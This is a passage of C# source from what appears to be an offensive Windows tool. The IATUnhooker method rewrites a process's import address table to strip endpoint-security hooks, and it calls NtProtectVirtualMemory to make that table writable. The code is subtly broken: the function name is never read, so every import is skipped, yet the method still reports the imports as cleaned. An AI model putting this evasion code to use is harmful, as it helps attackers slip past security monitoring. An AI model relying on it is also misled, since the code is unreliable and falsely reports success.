        Console.WriteLine("[-] {0} exports are cleaned.", ModuleName.ToUpper());
    }

    public static void IATUnhooker(string ModuleName)
    {
        IntPtr PEBaseAddress = IntPtr.Zero;
        try { PEBaseAddress = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress; } catch { }
        if (PEBaseAddress == IntPtr.Zero)
        {
            Console.WriteLine("[-] Module is not loaded, Skipping...");
            return;
        }

        // parse the initial header of the PE
        IntPtr OptHeader = PEBaseAddress + Marshal.ReadInt32(PEBaseAddress + 0x3C) + 0x18;
        IntPtr SizeOfHeaders = (IntPtr)Marshal.ReadInt32(OptHeader + 60);
        short Magic = Marshal.ReadInt16(OptHeader + 0);
        IntPtr DataDirectoryAddr = IntPtr.Zero;
        if (Magic == 0x010b)
        {
            DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + 0x60); // PE32, 0x60 = 96 
        }
        else
        {
            DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + 0x70); // PE32+, 0x70 = 112
        }

        // get the base address of all of the IAT array, and get the whole size of the IAT array
        IntPtr IATBaseAddress = (IntPtr)(PEBaseAddress.ToInt64() + Marshal.ReadInt32(DataDirectoryAddr + 96));
        IntPtr IATSize = (IntPtr)Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + 96 + 4));

        // check if current PE have any import(s)
        if ((int)IATSize == 0)
        {
            Console.WriteLine("[-] Module doesnt have any imports, Skipping...");
            return;
        }

        // change memory protection of the IAT to RW
        uint oldProtect = 0;
        if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, 0x04, ref oldProtect))
        {
            Console.WriteLine("[-] Failed to change IAT's memory protection to RW!");
            return;
        }

        // get import table address
        int ImportTableSize = Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + 12)); //  IMPORT TABLE Size = byte 8 + 4 (4 is the size of the RVA) from the start of the data directory
        IntPtr ImportTableAddr = (IntPtr)(PEBaseAddress.ToInt64() + Marshal.ReadInt32(DataDirectoryAddr + 8)); // IMPORT TABLE RVA = byte 8 from the start of the data directory
        int ImportTableCount = ImportTableSize / 20;

        // iterates through the import tables
        for (int i = 0; i < (ImportTableCount - 1); i++)
        {
            IntPtr CurrentImportTableAddr = (IntPtr)(ImportTableAddr.ToInt64() + 20 * i);

            string CurrentImportTableName = Marshal.PtrToStringAnsi((IntPtr)(PEBaseAddress.ToInt64() + Marshal.ReadInt32(CurrentImportTableAddr + 12))).Trim(); // Name RVA = byte 12 from start of the current import table
            if (CurrentImportTableName.StartsWith("api-ms-win"))
            {
                continue;
            }

            // get IAT (FirstThunk) and ILT (OriginalFirstThunk) address from Import Table
            IntPtr CurrentImportIATAddr = (IntPtr)(PEBaseAddress.ToInt64() + Marshal.ReadInt32((IntPtr)(CurrentImportTableAddr.ToInt64() + 16))); // IAT RVA = byte 16 from the start of the current import table
            IntPtr CurrentImportILTAddr = (IntPtr)(PEBaseAddress.ToInt64() + Marshal.ReadInt32(CurrentImportTableAddr)); // ILT RVA = byte 0 from the start of the current import table

            // get the imported module base address
            IntPtr ImportedModuleAddr = IntPtr.Zero;
            try { ImportedModuleAddr = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => CurrentImportTableName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress; } catch { }
            if (ImportedModuleAddr == IntPtr.Zero)
            { // check if its loaded or not
                continue;
            }

            // loop through the functions
            for (int z = 0; z < 999999; z++)
            {
                IntPtr CurrentFunctionILTAddr = (IntPtr)(CurrentImportILTAddr.ToInt64() + IntPtr.Size * z);
                IntPtr CurrentFunctionIATAddr = (IntPtr)(CurrentImportIATAddr.ToInt64() + IntPtr.Size * z);

                // check if current ILT is empty
                if (Marshal.ReadIntPtr(CurrentFunctionILTAddr) == IntPtr.Zero)
                { // the ILT is null, which means we're already on the end of the table
                    break;
                }

                IntPtr CurrentFunctionNameAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadIntPtr(CurrentFunctionILTAddr)); // reading a union structure for getting the name RVA
                string CurrentFunctionName = string.Empty;
                if (CurrentFunctionName != "NtQueueApcThread" && !string.IsNullOrEmpty(CurrentFunctionName))
                {
                    CurrentFunctionName = Marshal.PtrToStringAnsi(CurrentFunctionNameAddr + 2).Trim(); // reading the Name field on the Name table

                }

                if (string.IsNullOrEmpty(CurrentFunctionName))
                {
                    continue; // used to silence ntdll's RtlDispatchApc ordinal imported by kernelbase
                }
                if (IsBlacklistedFunction(CurrentFunctionName))
                {
                    continue;
                }

                // get current function real address
                IntPtr CurrentFunctionRealAddr = Dynavoke.GetExportAddress(ImportedModuleAddr, CurrentFunctionName);
                if (CurrentFunctionRealAddr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to find function export address of {0} from {1}! CurrentFunctionNameAddr = {2}", CurrentFunctionName, CurrentImportTableName, CurrentFunctionNameAddr.ToString("X4"));
                    continue;
                }

                // compare the address
                if (Marshal.ReadIntPtr(CurrentFunctionIATAddr) != CurrentFunctionRealAddr)
                {
                    try { Marshal.WriteIntPtr(CurrentFunctionIATAddr, CurrentFunctionRealAddr); }
                    catch (Exception e)
                    {
                        Console.WriteLine("[-] Failed to rewrite IAT of {0}! Reason : {1}", CurrentFunctionName, e.Message);
                    }
                }
            }
        }

        // revert IAT's memory protection
        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, oldProtect, ref newProtect);
        Console.WriteLine("[-] {0} imports are cleaned.", ModuleName.ToUpper());
    }
}